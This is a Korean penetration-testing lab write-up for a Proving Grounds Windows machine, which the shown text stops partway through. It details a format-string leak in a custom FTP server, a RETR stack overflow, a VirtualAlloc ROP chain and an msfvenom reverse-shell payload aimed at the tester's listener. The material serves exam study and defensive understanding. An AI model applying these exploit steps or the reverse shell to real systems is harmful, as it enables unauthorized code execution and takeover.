---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/pwn/bof
  - tech/pwn/format-string
  - tech/pwn/rop
  - tech/win/sedebugprivilege
  - tech/svc/ftp
  - tech/payload/msfvenom
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.243.20
ports: [21, 135, 139, 445, 3389, 5985, 47001]
services: [ftp, http, microsoft-ds, ms-wbt-server, msrpc, netbios-ssn]
status: solved
manual_tags: true
tech_count: 7
---

> [!info] PG Practice — Advanced · 플래그 2/2
> **타겟** 192.168.243.20 · **OS** Windows Server 2019 (`OSAKA`, 10.0.17763.4252) · **난이도** Advanced
> **경로 요약** 21번 **커스텀 "Simple FTP Server"** → `admin:admin` 로그인 → 비표준 **`DEBUG` 명령의 포맷 스트링**으로 이미지 베이스 릭(ASLR 우회) → **`RETR` 인자 스택 오버플로우**(EIP 오프셋 272) → **VirtualAlloc ROP 체인**(DEP 우회) → `shell_reverse_tcp` → `Wilson` 셸 · `local.txt`
> → `whoami /priv`에 **`SeDebugPrivilege` Enabled** → winlogon.exe(SYSTEM) 핸들 탈취 후 자식 프로세스 생성 → **`nt authority\system`** · `proof.txt`

> [!danger] 색인 정정 — 이 박스는 LFI/RFI가 아니다
> 이 노트의 frontmatter에는 원래 `tech/web/lfi-rfi`가 달려 있었으나 **본문에 LFI·RFI·경로탐색은 단 한 번도 등장하지 않는다.**
> 실제 체인은 **바이너리 익스플로잇(포맷 스트링 릭 + 스택 오버플로우 + ROP)** → **Windows 권한 토큰 남용**이다. 태그를 `tech/pwn/bof` · `tech/pwn/format-string` · `tech/pwn/rop` · `tech/win/sedebugprivilege`로 교체했다.
> 웹 포트는 5985/47001(WinRM·WSMan의 HTTP 리스너)뿐이고 **웹 애플리케이션 자체가 없다.**

## 0. 이 박스에서 배우는 것

- **nmap이 못 알아보는 서비스 = 커스텀 바이너리 = 메모리 손상 후보.** `fingerprint-strings`가 뜨면 그 자체가 신호다
- **포맷 스트링으로 ASLR을 깨는 법** — 릭 값 하나에서 이미지 베이스를 역산하는 절차
- **DEP가 켜진 Windows에서 셸코드를 실행하는 법** — `VirtualAlloc` ROP 체인(mona 표준형)의 레지스터 매핑과 `PUSHAD` 트릭
- **셸코드를 눈으로 검증하는 법** — 바이트 안에서 LHOST/LPORT/`cmd\0`를 직접 찾아 "이게 meterpreter가 아니라 순수 cmd 셸"임을 확인
- **Windows 권한(privilege) 기반 권한상승** — `SeImpersonatePrivilege`(Potato 계열)가 없을 때 `SeDebugPrivilege`로 SYSTEM 프로세스를 부모 삼는 법
- **`certutil`이 404 응답을 파일로 저장한다** — 이 박스에서 실제로 당했다(6장 ①)
- **FTP `ascii` 모드로 바이너리를 받으면 조용히 깨진다** — 이 박스에서도 당했다(6장 ⑪). 전송 성공은 종료 코드가 아니라 **크기·해시**로 판정한다

> [!tip] 시험 출제 가능성
> **유형은 높고, 형태는 바뀐다.** PEN-200 개편으로 "전용 BOF 머신 1대"는 사라졌지만 [가정], **정체불명 포트에 붙은 커스텀 서비스**를 붙잡고 늘어져야 하는 상황은 그대로 남는다.
> 시험 난이도라면 여기서 **포맷 스트링 릭 + ROP까지는 잘 안 나온다**. 대신 **ASLR/DEP 없는 단순 EIP 덮어쓰기 + `JMP ESP`** 형태가 나올 확률이 높다. 이 노트는 그 "상위 호환"을 다루므로, **오프셋 구하기 → 배드캐릭터 → EIP 제어 → 셸코드 배치**의 뼈대만 뽑아 외워두면 시험형에 그대로 대응된다.
> 권한상승 쪽 **`whoami /priv` 반사는 출제 가능성 매우 높다.** SYSTEM으로 가는 지름길이 여기 다 적혀 있는 경우가 흔하다.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ nnmap 192.168.243.20
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-18 08:51 +0900
Nmap scan report for 192.168.243.20
Host is up (0.085s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp
| fingerprint-strings:
|   GenericLines, NULL, SSLSessionReq:
|_    220 Welcome to Simple FTP Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=osaka
| Not valid before: 2026-08-16T23:49:31
|_Not valid after:  2027-02-15T23:49:31
| rdp-ntlm-info:
|   Target_Name: OSAKA
|   NetBIOS_Domain_Name: OSAKA
|   NetBIOS_Computer_Name: OSAKA
|   DNS_Domain_Name: osaka
|   DNS_Computer_Name: osaka
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-17T23:53:27+00:00
|_ssl-date: 2026-08-17T23:53:34+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.98%I=7%D=8/18%Time=6A839EB6%P=x86_64-pc-linux-gnu%r(NULL
SF:,22,"220\x20Welcome\x20to\x20Simple\x20FTP\x20Server\r\n")%r(GenericLin
SF:es,24,"220\x20Welcome\x20to\x20Simple\x20FTP\x20Server\r\n\r\n")%r(SSLS
SF:essionReq,24,"220\x20Welcome\x20to\x20Simple\x20FTP\x20Server\r\n\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=8/18%OT=21%CT=1%CU=34081%PV=Y%DS=4%DC=T%G=Y%TM=6A839F3
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=I%CI=I%TS=U)SEQ(SP=1
OS:04%GCD=1%ISR=10F%TI=I%CI=I%TS=U)SEQ(SP=107%GCD=1%ISR=107%TI=I%CI=I%TS=U)
OS:SEQ(SP=107%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=FD%GCD=1%ISR=10C%TI=I%CI=
OS:I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578N
OS:W8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: Simple; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-08-17T23:53:27
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   84.72 ms 192.168.45.1
2   84.67 ms 192.168.45.254
3   85.37 ms 192.168.251.1
4   85.54 ms 192.168.243.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 151.61 seconds
```

> [!note] 명령 줄의 `nnmap` 오타는 원문 그대로 보존했다
> 출력이 정상적으로 나왔으므로 실제로 실행된 것은 `nmap`이다. `Not shown: 65521 closed tcp ports`와 `-sCV`급 배너·스크립트 결과가 함께 나온 것으로 보아 **`-p- -sCV -A` 상당의 옵션**이 붙어 있었다 [가정].

### 이 스캔에서 결정적인 세 줄

| 줄 | 왜 중요한가 |
|---|---|
| `21/tcp open ftp` + **VERSION 칸이 비어 있음** | nmap이 **제품을 특정하지 못했다.** vsftpd·FileZilla·ProFTPD 같은 알려진 제품이면 이름이 찍힌다. 비어 있다 = **커스텀 구현** |
| `1 service unrecognized despite returning data` + `SF-Port21-TCP:` **핑거프린트 덤프** | nmap이 "제출해달라"고 할 정도로 **DB에 없는 서비스**다. 공개 CVE·`searchsploit`으로 안 나올 가능성이 크고, **직접 프로토콜을 두드려봐야 한다**는 뜻 |
| `Service Info: Host: Simple` | 호스트명이 `OSAKA`인데 서비스 배너에서 뽑힌 이름은 `Simple`. 배너 `220 Welcome to Simple FTP Server`의 **첫 단어는 `Welcome`이지 `Simple`이 아니다** — nmap은 첫 단어를 집는 것이 아니라 `^220 ([\w._-]+) FTP [Ss]erver` 꼴 **정규식의 캡처 그룹**을 `h/$1/`(호스트명 필드)로 넘긴다. 즉 **`FTP Server` 바로 앞 토큰**이 뽑힌 것이다. **배너 문자열이 곧 제품명 후보**다 |

> [!danger] `fingerprint-strings` 블록이 뜨면 그 포트가 그날의 정답이다
> nmap의 서비스 DB는 실무에서 쓰이는 제품을 거의 다 안다. **그 DB에 없다 = 이 박스를 위해 만들어진 바이너리 = 출제자가 의도한 진입점.**
> 이때 반사적으로 할 일은 `searchsploit ftp`가 아니라 **`nc`로 붙어서 프로토콜을 손으로 두드려보는 것**이다:
> ```bash
> nc -nv 192.168.243.20 21
> USER anonymous
> HELP            # ← 구현된 명령 목록이 나오면 즉시 공격면이 드러난다
> SITE HELP
> ```
> 표준 FTP에 없는 명령(`DEBUG` 같은)이 튀어나오면 **그게 백도어이자 취약점**이다.

### 나머지 포트 판정

| 포트 | 판정 | 근거 |
|---|---|---|
| 3389 RDP | **Windows Server 2019** | `Product_Version: 10.0.17763` (=Server 2019 / Win10 1809 빌드). 나중에 셸에서 `Microsoft Windows [Version 10.0.17763.4252]`로 **독립 근거 2개 교차 확인** |
| 445 SMB | 인증 없이 열거는 기대하기 어려움 | `Message signing enabled but not required` — 서명이 강제되지 않으므로 **AD 환경이었다면 SMB 릴레이 후보**. 이 박스는 워크그룹이라 해당 없음 |
| 5985 / 47001 | **WinRM(WSMan)** | `Microsoft-HTTPAPI/2.0` + `http-title: Not Found`. 웹 서버가 아니라 **자격증명을 얻은 뒤 `evil-winrm`으로 되돌아올 통로**다 |
| 49664–49670 | RPC 동적 포트 | 정상. 공격면 아님 |

> [!tip] 5985가 열려 있다는 사실은 "나중에 쓸 카드"로 적어둔다
> 이 박스에서는 안 썼지만, **평문 자격증명이 하나라도 나오면 `evil-winrm -i <ip> -u <user> -p <pass>`가 가장 안정적인 셸**이다.
> 리버스셸과 달리 **아웃바운드 방화벽에 걸리지 않고**, 끊겨도 즉시 재접속된다.

---

## 2. 취약점 분석

> [!abstract] 이 장의 구조
> 커스텀 서비스 하나에 **취약점이 두 개** 들어 있다.
> **(A) `DEBUG` 명령의 포맷 스트링** — 정보 유출 전용. 단독으로는 셸이 안 된다.
> **(B) `RETR` 인자의 스택 버퍼 오버플로우** — 코드 실행. 단독으로는 ASLR 때문에 못 쓴다.
> **둘을 결합해야만 성립한다.** 이 "릭 + 오버플로우" 조합이 현대 바이너리 익스플로잇의 표준 형태다.

### 2-1. 배경 지식 — 왜 커스텀 네트워크 서비스는 뚫리는가

FTP는 **텍스트 기반 명령·응답 프로토콜**이다. 서버는 소켓에서 한 줄을 읽어 `명령 인자\r\n`으로 쪼갠다. C/C++로 이걸 짜면 거의 항상 다음 패턴이 나온다:

```c
char line[1024];
int n = recv(sock, line, sizeof(line), 0);   // ← 받은 "길이"를 그대로 들고 다닌다
if (!memcmp(line, "RETR ", 5)) {
    char path[256];                          // 고정 크기 스택 버퍼
    memcpy(path, line + 5, n - 5);           // ← 목적지 크기를 검사하지 않는다
    ...
}
```

> [!note] 이 박스의 파서는 **문자열 기반이 아니라 길이 기반**이다 — 근거가 있다
> 교과서적 예시라면 `sscanf` + `strcpy` 조합을 쓰지만, **이 박스는 그쪽이 아니다.** 셸코드 안의 `\x00` 12개가 잘리지 않고 그대로 전달됐기 때문이다(2-9절·6장 ⑥). `strcpy`였다면 **첫 널에서 복사가 멈춰** 셸코드가 6바이트째에서 끊겼을 것이다.
> 따라서 위 의사코드는 `recv`가 돌려준 **길이**를 기준으로 복사하는 형태로 적었다 [가정]. 실제 소스는 확보하지 못했으므로 정확한 함수는 알 수 없지만, **널이 통과했다는 관측 사실**은 `memcpy` 계열을 가리킨다.

`strcpy`/`sprintf`/`strcat`은 **목적지 크기를 모르고**, `memcpy`는 **길이를 인자로 받되 그 길이가 목적지에 맞는지 검사하지 않는다.** 어느 쪽이든 인자가 버퍼보다 길면 스택의 저장된 EBP와 **반환 주소(EIP)**까지 그대로 덮인다. 함수가 `ret`할 때 CPU는 우리가 써넣은 값으로 점프한다.

> [!note] 왜 웹이 아니라 바이너리인가 — 판단 기준
> | 신호 | 결론 |
> |---|---|
> | nmap이 버전을 못 붙임 + 핑거프린트 덤프 | 커스텀 바이너리 → **메모리 손상 우선** |
> | 알려진 제품 + 버전 번호 | `searchsploit` / CVE 우선 |
> | 긴 입력을 넣었을 때 **연결이 끊기거나 서비스가 죽음** | 오버플로우 확정 신호 |
>
> **A/B 판정을 먼저 하라.** 커스텀 바이너리에 `searchsploit`을 돌리는 것은 시간 낭비이고, 알려진 제품에 퍼징을 하는 것도 시간 낭비다.

### 2-2. 인증 — `admin:admin`

```python
p.sendline(b"USER admin")
p.recvuntil(b"331 User OK, password required")
p.sendline(b"PASS admin")
p.recvuntil(b"230 Login successful")
```

실제 응답이 `331 User OK, password required` → `230 Login successful`로 돌아왔으므로 **`admin:admin`이 유효한 기본 자격증명**이다.

> [!warning] 이 자격증명을 어떻게 얻었는지는 원문에 기록되지 않았다
> 기본 계정 추측(`admin:admin`, `anonymous:`) 또는 배너 검색으로 찾았을 것 [가정].
> **커스텀 서비스를 만나면 인증부터 손으로 확인하라.** 취약한 명령(`DEBUG`·`RETR`)이 **로그인 이후에만 열리는지**가 익스플로잇 난이도를 통째로 바꾼다. 여기서는 로그인이 필요했다.
> ```bash
> # 수동 확인 (pwntools 없이)
> printf 'USER admin\r\nPASS admin\r\nHELP\r\n' | nc -nv 192.168.243.20 21
> ```

### 2-3. 취약점 (A) — `DEBUG` 명령의 포맷 스트링

```python
p.sendline(b"DEBUG " + b"%x|" * 100)
```

응답:

```
b'DEBUG 12d10f0|546b8|54438|0|6fec24|55424544|32312047|66303164|34357c30|...'
```

**`%x` 100개가 그대로 16진수 값으로 치환되어 돌아왔다.** 서버 코드가 이런 모양이라는 뜻이다:

```c
// 취약: 사용자 입력이 포맷 문자열 자리에 들어간다
printf(user_input);
sprintf(out, user_input);
// 안전: 입력은 인자여야 한다
printf("%s", user_input);
```

> [!note] 왜 이것이 정보 유출이 되는가 — 데이터 흐름
> x86 `cdecl`에서 가변인자는 **스택에서 순서대로** 읽힌다. `printf`는 포맷 문자열에 `%x`가 몇 개인지 세지 않고, **`%x` 하나마다 스택을 4바이트씩 위로 훑으며 출력**한다.
> 인자를 하나도 안 넘겼으므로 `%x`들은 **호출 시점의 스택 프레임 잔재**를 그대로 뱉는다. 그 잔재에는 **저장된 반환 주소·저장된 EBP·이전 함수의 지역 변수 포인터**가 섞여 있고, 이것들은 **모듈 베이스 + 고정 오프셋** 형태다.
> → **하나만 알아내면 베이스가 역산된다.**

### 2-4. 릭 값 해석 — 어디까지가 "진짜 스택"인가

릭을 인덱스별로 뜯으면 경계가 선명하게 보인다:

| 인덱스 | 값 | 정체 |
|---|---|---|
| 0 | `0x12d10f0` | **실행 이미지 내부 포인터** → 익스플로잇이 쓰는 값 |
| 1 | `0x546b8` | 스택/힙 잔재 |
| 2 | `0x54438` | 스택/힙 잔재 |
| 3 | `0x0` | 널 |
| 4 | `0x6fec24` | 코드에서 `leak_ntdll`로 이름 붙였지만 **실제로는 쓰이지 않는다** |
| **5** | `0x55424544` | **`"DEBU"`** ← 여기서부터 성격이 바뀐다 |
| 6 | `0x32312047` | `"G 12"` |
| 7 | `0x66303164` | `"d10f"` |
| 8 | `0x34357c30` | `"0|54"` |

> [!danger] 인덱스 5부터는 **자기 자신의 출력 버퍼를 읽고 있다**
> 리틀엔디언으로 되돌리면 `55424544` → `44 45 42 55` → `"DEBU"`, 이어서 `"G 12"`, `"d10f"`, `"0|54"`.
> 이어붙이면 **`DEBUG 12d10f0|54...`** — 바로 **이 응답 자체**다.
> 즉 출력 버퍼가 포맷 문자열 프레임 바로 위에 있어서, `%x`가 6번째부터 **자기가 방금 쓴 글자들을 다시 읽어 출력**한다.
>
> **실전 의미: 릭 값이 갑자기 ASCII처럼 보이는 지점이 "쓸모 있는 스택"의 끝이다.** 그 앞쪽 4~5개만이 진짜 포인터다. 이 경계를 못 찾으면 엉뚱한 인덱스를 베이스로 잡고 몇 시간을 태운다.
> 판별법: 값의 각 바이트가 **0x20~0x7E 범위**에 몰려 있으면 문자열이다.

### 2-5. 베이스 역산 — `- 0x10f0`의 정체

```python
leak_pie = int(leak[0], 16)     # 0x012d10f0
bin_base = leak_pie - 0x10f0    # 0x012d0000
```

```
Binary Base:   0x12d0000
```

> [!note] 왜 `0x10f0`인가
> Windows PE 이미지는 4KB 페이지가 아니라 **64KB 할당 단위(allocation granularity)** 경계에 매핑된다. 따라서 이미지 베이스는 **하위 16비트가 항상 0**이다.
> 실측이 그대로 맞는다 — PE 헤더의 `ImageBase = 0x00400000`, 이 실행에서의 실제 로드 베이스 `0x012d0000`. **둘 다 하위 4자리가 `0000`**이다.
> 릭 값 `0x012d10f0`에서 하위 4자리 `10f0`은 **베이스로부터의 오프셋(RVA) 0x10f0**이고, 나머지 `0x012d0000`이 베이스다.
> **오프셋 0x10f0은 이 바이너리를 로컬(또는 디버거)에서 한 번 열어봐야 나오는 값이다** — 릭 값과 그때 확인한 실제 베이스의 차이가 0x10f0이었을 뿐이다.
> **일반화: 릭의 하위 16비트가 0이 아니면, 그 값은 베이스가 아니라 "베이스 + RVA"다. RVA를 빼라.**
> 검산법 — 계산된 베이스의 **하위 4자리가 `0000`이면 맞을 확률이 높다.** `0x12d0000` ✓

### 2-6. 취약점 (B) — `RETR` 인자 스택 오버플로우

```python
buf  = b""
buf += b"A" * (268 + 4)
buf += rop
```

**EIP 오프셋은 272바이트다.** 전송된 패킷 헥사덤프가 이를 확정한다:

```
00000110  41 41 41 41  41 45 e1 2d  01 45 e1 2d  01 a9 d5 2e  │AAAA│AE·-│·E·-│···.│
```

- 패킷 시작 `RETR ` = 5바이트(`0x00`~`0x04`)
- A는 `0x05`부터 `0x114`까지 = **272바이트**
- `0x115`부터 첫 ROP 가젯 `45 e1 2d 01`(= `0x012de145`, 리틀엔디언) 시작

즉 `RETR ` 뒤 **272번째 바이트 다음 4바이트가 곧 EIP**다. `268 + 4`라는 표기는 "지역 버퍼 268 + 저장된 EBP 4"를 뜻한다 [가정].

> [!tip] 오프셋을 구하는 표준 절차 (이 노트의 핵심 재사용 자산)
> ```bash
> # 1) 죽는 길이를 찾는다 — 100씩 늘려가며 서비스가 끊기는 지점
> # 2) 고유 패턴 생성
> msf-pattern_create -l 1000
> # 3) 크래시 시 EIP 값을 디버거(x64dbg / Immunity)에서 읽고
> msf-pattern_offset -l 1000 -q 42306142
> # → 268 같은 숫자가 나온다
> # 4) 검증: "A"*offset + "BBBB" 를 보내 EIP == 0x42424242 인지 확인
> ```
> **4단계 검증을 건너뛰지 마라.** SEH 오버라이트 유형이면 EIP가 아니라 SEH 체인이 덮이는데, 검증 없이는 구분이 안 된다.

### 2-7. 왜 `JMP ESP` 하나로 끝나지 않는가 — 두 겹의 완화 기능

교과서적인 32비트 스택 오버플로우는 `EIP = JMP ESP 주소` 하나로 끝난다. 여기서는 **두 가지가 그것을 막는다.**

| 완화 기능 | 무엇을 막는가 | 이 익스플로잇의 우회법 |
|---|---|---|
| **ASLR** | 모듈이 매번 다른 주소에 로드 → `JMP ESP` 주소를 하드코딩할 수 없다 | **포맷 스트링 릭으로 베이스를 실행 시점에 계산.** 모든 가젯 주소를 `+ bin_base` |
| **DEP (NX)** | 스택 페이지가 **쓰기 가능하지만 실행 불가** → 스택 위 셸코드로 점프하면 즉시 죽는다 | **ROP로 `VirtualAlloc`을 호출해 스택 영역을 실행 가능하게 바꾼 뒤** 셸코드로 진입 |

> [!danger] "EIP는 잡았는데 셸코드가 안 돈다"의 90%는 DEP다
> 증상: EIP는 원하는 값으로 덮이고 점프도 하는데, **셸코드 첫 바이트에서 액세스 위반**이 난다.
> 확인: 디버거에서 스택 주소의 페이지 권한이 `RW`(실행 비트 없음)인지 본다.
> 처방: **ROP로 `VirtualAlloc`(새 RWX 영역) 또는 `VirtualProtect`(기존 영역 권한 변경)** 를 호출한다. 어느 쪽이든 mona.py가 체인을 자동 생성해준다.

### 2-8. ROP 체인 — 가젯 한 줄씩

```python
rop_gadgets = [
    # Setting up the registers for VirtualAlloc
    0xe145 + bin_base,  # POP EBP # RETN
    0xe145 + bin_base,  # Skip 4 bytes
    0x1d5a9 + bin_base, # POP EBX # RETN
    0x1,                # EBX = 1
    0x1bd7e + bin_base, # POP EDX # RETN
    0x1000,             # EDX = 0x1000 (size)
    0x11a2b + bin_base, # POP ECX # RETN
    0x40,               # ECX = 0x40 (executable permissions)
    0x4667 + bin_base,  # POP EDI # RETN
    0x4682 + bin_base,  # RETN (ROP NOP)
    0x1dff + bin_base,  # POP ESI # RETN
    0x14adb + bin_base, # JMP [EAX]
    0x1d2bf + bin_base, # POP EAX # RETN
    0x1e008 + bin_base, # Pointer to VirtualAlloc()
    0x10d6 + bin_base,  # PUSHAD # RETN
    0x10da + bin_base,  # JMP ESP
]
```

이것은 **mona.py `!mona rop -m <module>`이 생성하는 표준 `VirtualAlloc` 체인**이다. 각 레지스터가 그냥 채워지는 게 아니라, **`PUSHAD` 한 번으로 함수 호출 프레임을 통째로 조립**하려고 정해진 자리에 배치된다.

**`VirtualAlloc` 원형:**

```c
LPVOID VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize,
                    DWORD flAllocationType, DWORD flProtect);
```

`PUSHAD`는 레지스터를 **EAX → ECX → EDX → EBX → ESP → EBP → ESI → EDI** 순으로 푸시한다. 스택은 아래로 자라므로, 푸시가 끝난 뒤 **낮은 주소부터** 이렇게 놓인다:

| 스택 위치 (ESP 기준) | 들어 있는 값 | `RETN` 이후의 역할 |
|---|---|---|
| `[ESP+0]` | **EDI** = `RETN` 가젯 | `PUSHAD` 뒤 `RETN`이 여기로 점프 → **ROP NOP**(정렬용) |
| `[ESP+4]` | **ESI** = `JMP [EAX]` | 다음 `RETN`이 여기로 → EAX(=`VirtualAlloc` IAT 포인터)를 **간접 호출** |
| `[ESP+8]` | **EBP** = `POP EBP # RETN` | **`VirtualAlloc`의 반환 주소**가 된다 |
| `[ESP+12]` | **ESP**(원래 값) | → 1번 인자 `lpAddress` (스택 주소 = 여기를 실행 가능하게 만든다) |
| `[ESP+16]` | **EBX** = `0x1` | → 2번 인자 `dwSize`. 1바이트만 요청해도 **커널이 한 페이지(4KB) 단위로 올려준다** |
| `[ESP+20]` | **EDX** = `0x1000` | → 3번 인자 `flAllocationType` = **`MEM_COMMIT`** |
| `[ESP+24]` | **ECX** = `0x40` | → 4번 인자 `flProtect` = **`PAGE_EXECUTE_READWRITE`** |
| `[ESP+28]` | **EAX** | 인자 아님. 아래 "4바이트 건너뛰기"가 처리 |

> [!note] 주석의 `# EDX = 0x1000 (size)`는 **틀린 주석**이다
> 실제로 `0x1000`은 크기가 아니라 **`MEM_COMMIT` 플래그**이고, 크기는 `EBX = 1`이다.
> mona가 뱉은 템플릿 주석을 그대로 둔 것으로 보인다 [가정]. 값 배치 자체는 정확하므로 익스플로잇은 동작한다.
> **일반화: 생성 도구의 주석을 믿지 말고 API 원형과 대조하라.** 값을 손으로 바꿔야 할 때 주석만 보고 고치면 바로 깨진다.

**실행 흐름 전체:**

1. `POP EBP` 계열 가젯들이 차례로 실행되며 EBP/EBX/EDX/ECX/EDI/ESI/EAX를 위 표대로 채운다
2. `PUSHAD # RETN` — 레지스터 8개를 스택에 뿌려 **`VirtualAlloc` 호출 프레임을 완성**하고, `RETN`이 `[ESP]`(=EDI, `RETN` 가젯)로 점프
3. `RETN` 하나 더 → `[ESP+4]`(=ESI, `JMP [EAX]`)로 점프 → **`VirtualAlloc` 진입**. 이 시점 `[ESP]`는 반환 주소(EBP 값), 그 위 4개가 정확히 인자 4개다
4. `VirtualAlloc`이 **스택 영역을 RWX로 커밋**하고, stdcall이므로 **인자 4개를 스스로 정리**하며 EBP 값으로 반환
5. EBP = `POP EBP # RETN` → 남아 있는 EAX 슬롯 **4바이트를 삼키고**(주석의 *"Skip 4 bytes"*) `RETN`
6. `RETN`이 체인의 마지막 `JMP ESP`로 점프 → **ESP는 이제 NOP 슬레드를 가리킨다** → 셸코드 실행

> [!danger] `EBX = 1`을 "크기 1바이트라 부족하지 않나?" 라고 의심하지 마라
> `VirtualAlloc`은 **요청 크기를 페이지 단위로 올림(round up)** 한다. 1을 넘겨도 4096바이트가 RWX로 커밋된다. 셸코드 324바이트는 충분히 들어간다.
> 반대로 **`lpAddress`(=원래 ESP)도 페이지 시작 주소로 내림 정렬**되므로, 셸코드가 놓일 스택 페이지 전체가 실행 가능해진다.

### 2-9. 왜 이 셸코드인가 — msfvenom 플래그 해설

```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.45.207 LPORT=443 -f py -v sc -o shellcode.txt
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of py file: 1576 bytes
Saved as: shellcode.txt
```

| 플래그 | 역할 | 빼면 어떻게 되나 |
|---|---|---|
| `-a x86` | 32비트 아키텍처 | 64비트 셸코드를 32비트 프로세스에 넣으면 **즉시 크래시**. 릭 값이 4바이트였다는 사실이 32비트의 근거 |
| `--platform windows` | 대상 OS | 생략 시 페이로드 이름으로 추론하지만, **경고와 함께 엉뚱한 조합**이 나올 수 있다 |
| `-p windows/shell_reverse_tcp` | **순수 cmd 리버스셸** | `meterpreter/*`를 고르면 **OSCP 시험에서 문제가 된다**(7장). 또한 meterpreter는 스테이저라 **추가 통신이 필요**해 방화벽에 더 취약 |
| `LPORT=443` | 리스너 포트 | 4444 같은 고번호는 **아웃바운드 방화벽에 막히는 경우가 흔하다.** 443/80/53이 뚫려 있을 확률이 높다 |
| `-f py -v sc` | 출력 형식 python, **변수명을 `sc`로** | `-v` 없으면 변수명이 `buf`. 스크립트에서 쓰는 이름과 맞춰두면 복붙 실수가 준다 |
| **인코더 없음** | `No encoder specified, outputting raw payload` | **배드캐릭터가 없다는 뜻이 아니라, 확인을 생략했다는 뜻**이다. 이 박스에서는 파서가 길이 기반이라 `\x00` 12개가 그대로 통과했다(바로 아래) |

> [!danger] 배드캐릭터를 확인하지 않았다 — 다만 "운이 좋았던 것"은 아니다
> 흔한 통념은 "FTP는 줄 단위 텍스트 프로토콜이니 `\x00`(문자열 종료) · `\x0a`(LF) · `\x0d`(CR)는 거의 확실히 배드캐릭터"라는 것이다. **이 박스에서는 그 통념이 성립하지 않는다.**
> 셸코드 324바이트 안에 **`\x00`이 12개, `\x0d`가 2개, `\x0a`가 1개** 들어 있고, 그 상태로 셸이 떨어졌다. 3-3절 헥사덤프에 그대로 보인다 — `fc e8 82 00 00 00`(셸코드 오프셋 3~5) · `c1 cf 0d 01`(39) · `7c 0a 80 fb`(308) · `68 63 6d 64 00`. ROP 체인에도 널이 있다: `EBX=1` → `01 00 00 00`, `EDX=0x1000` → `00 10 00 00`, `ECX=0x40` → `40 00 00 00`.
> **즉 교훈은 "운이 좋았다"가 아니라 "이 취약점은 배드캐릭터가 없는 유형이다"이다.** 널을 12개 통과시켰다는 것은 **파서가 문자열이 아니라 고정 길이 버퍼를 읽는다**는 증거다 — 길이 기반 `recv`/`memcpy`로 인자를 복사하므로 `\x00`에서 잘리지 않는다(2-1절).
> **그래도 절차는 바꾸지 마라.** 배드캐릭터의 유무는 **프로토콜이 아니라 파서 구현이 정하고, 덤프를 보기 전에는 알 수 없다.** 실전 절차: `"\x01\x02...\xff"` 전체를 보내고 디버거 메모리에서 **끊기거나 변형된 바이트**를 찾아 제거 목록을 만든 뒤
> ```bash
> msfvenom ... -b '\x00\x0a\x0d' -f py -v sc
> ```
> **`-b`를 빼먹어 셸코드가 중간에 잘리면 "ROP가 틀렸나" 하고 엉뚱한 데를 파게 된다.** 이 실수의 시간 손실이 가장 크다.

> [!tip] 셸코드를 눈으로 검증하는 법 — 실행 전에 30초면 된다
> 생성된 바이트에서 **LHOST·LPORT·프로그램명**이 그대로 보인다:
> | 바이트 | 의미 |
> |---|---|
> | `\x68\xc0\xa8\x2d\xcf` | `push 0xcf2da8c0` → `c0 a8 2d cf` = **192.168.45.207** (LHOST) |
> | `\x68\x02\x00\x01\xbb` | `push` sockaddr → `0x0002`=`AF_INET`, `0x01bb`= **443** (LPORT) |
